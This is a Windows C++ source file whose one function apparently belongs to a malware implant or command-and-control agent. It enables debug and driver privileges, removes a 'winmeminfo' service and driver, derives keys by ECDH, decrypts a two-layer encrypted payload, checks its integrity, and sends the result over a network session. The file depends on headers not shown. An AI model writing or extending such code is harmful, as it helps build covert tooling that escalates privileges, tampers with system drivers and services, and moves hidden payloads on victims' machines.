#include <algorithm>
#include <array>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <filesystem>
#include <memory>
#include <optional>
#include <span>
#include <stdexcept>
#include <string>
#include <string_view>
#include <thread>
#include <utility>
#include <vector>
#include <windows.h>
#include <winternl.h>
#include <winsvc.h>
#include <oleauto.h>
#include "../../payload/crypto/crypto.hpp"
#include "../../storage/services/services.hpp"
#include "security/privileges/privileges.hpp"
#include "pipelines.hpp"

namespace makima::network::session {
bool send_authenticated_request(const std::byte* data, std::size_t size) noexcept;
}

namespace makima::application::shared {
Octets* orchestrate_authenticated_request_and_debug_driver(
    PayloadPipelineContext* context,
    Octets* plaintext,
    char* encrypted_request,
    char* request_context) noexcept {
    if (context == nullptr || plaintext == nullptr || encrypted_request == nullptr || request_context == nullptr) {
        return nullptr;
    }
    const bool privileges_enabled =
        ::makima::security::privileges::enable_debug_and_driver_privileges();



    ::makima::storage::services::remove_winmeminfo_service_and_driver();
    if (!privileges_enabled) return nullptr;

    const auto encrypted_size = std::strlen(encrypted_request);
    const auto context_size = std::strlen(request_context);
    ::makima::payload::crypto::PayloadKey derived_key{};
    if (encrypted_size >= derived_key.size()) {
        ::makima::payload::crypto::PayloadKey ecdh_key{};
        if (!::makima::security::privileges::derive_ephemeral_payload_key(
                std::span<const std::byte>{
                    reinterpret_cast<const std::byte*>(encrypted_request), encrypted_size},
                ecdh_key)) {
            return nullptr;
        }
        ::makima::payload::crypto::PayloadKey mixed_key{};
        const AuthenticatedTransportState transport{
            context, context->key.data(), ecdh_key.data()};
        if (xor_authenticated_transport_state(&transport, &mixed_key) == nullptr) {
            SecureZeroMemory(ecdh_key.data(), ecdh_key.size());
            return nullptr;
        }
        context->key = mixed_key;
        SecureZeroMemory(mixed_key.data(), mixed_key.size());
        SecureZeroMemory(ecdh_key.data(), ecdh_key.size());
    }
    if (::makima::payload::crypto::derive_payload_keys(
            context->key,
            reinterpret_cast<const std::byte*>(encrypted_request),
            encrypted_size,
            reinterpret_cast<const std::byte*>(request_context),
            context_size,
            derived_key) == 0) {
        return nullptr;
    }

    ::makima::payload::crypto::decrypt_gcm_payload_packet(
        *plaintext, derived_key, reinterpret_cast<const std::byte*>(encrypted_request), encrypted_size);
    if (plaintext->empty()) return nullptr;

    Octets cbc_plaintext;
    ::makima::payload::crypto::decrypt_cbc_payload_packet(
        cbc_plaintext, derived_key, plaintext->data(), plaintext->size());
    if (cbc_plaintext.empty() ||
        ::makima::payload::crypto::validate_payload_integrity(
            cbc_plaintext.data(), cbc_plaintext.size(), context->expected_digest) == 0) {
        plaintext->clear();
        return nullptr;
    }
    plaintext->swap(cbc_plaintext);
    if (!::makima::network::session::send_authenticated_request(plaintext->data(), plaintext->size())) {
        plaintext->clear();
        return nullptr;
    }
    return plaintext;
}

}
